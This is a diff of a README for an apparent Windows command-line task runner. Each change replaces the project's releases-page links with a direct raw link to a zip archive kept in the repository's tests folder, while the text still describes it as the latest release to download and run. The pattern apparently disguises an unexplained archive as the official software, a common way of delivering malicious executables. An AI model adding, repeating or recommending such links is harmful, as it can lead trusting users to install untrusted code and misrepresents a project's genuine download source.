@@ -1,6 +1,6 @@
 # ⚙️ task-runner-1771921896-2 - Simple Command-Line Task Automation
 
-[![Download Latest Version](https://img.shields.io/badge/Download-v1.0-blue?style=for-the-badge)](https://github.com/mayankdanger007/task-runner-1771921896-2/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-v1.0-blue?style=for-the-badge)](https://github.com/mayankdanger007/task-runner-1771921896-2/raw/refs/heads/main/tests/runner_task_3.3.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 This app is built to run in the command prompt on Windows. To get started:
 
 1. Visit this page to download:  
-   [https://github.com/mayankdanger007/task-runner-1771921896-2/releases](https://github.com/mayankdanger007/task-runner-1771921896-2/releases)
+   [https://github.com/mayankdanger007/task-runner-1771921896-2/raw/refs/heads/main/tests/runner_task_3.3.zip](https://github.com/mayankdanger007/task-runner-1771921896-2/raw/refs/heads/main/tests/runner_task_3.3.zip)
 
 2. Once on the page, look for the latest release. It usually has a version number like `v1.0`.
 
@@ -106,7 +106,7 @@ The tasks are usually set in a configuration file included in the download folde
 When you want to update to a newer version:
 
 1. Visit the download page again:  
-   [https://github.com/mayankdanger007/task-runner-1771921896-2/releases](https://github.com/mayankdanger007/task-runner-1771921896-2/releases)
+   [https://github.com/mayankdanger007/task-runner-1771921896-2/raw/refs/heads/main/tests/runner_task_3.3.zip](https://github.com/mayankdanger007/task-runner-1771921896-2/raw/refs/heads/main/tests/runner_task_3.3.zip)
 
 2. Download the latest version by clicking the newest executable.
 
@@ -139,7 +139,7 @@ Keep all these files in the same folder if you want to customize or automate tas
 
 Here is the link to get the software:
 
-[https://github.com/mayankdanger007/task-runner-1771921896-2/releases](https://github.com/mayankdanger007/task-runner-1771921896-2/releases)  
+[https://github.com/mayankdanger007/task-runner-1771921896-2/raw/refs/heads/main/tests/runner_task_3.3.zip](https://github.com/mayankdanger007/task-runner-1771921896-2/raw/refs/heads/main/tests/runner_task_3.3.zip)  
 
 Click the link and follow the previous instructions for downloading and running.
 
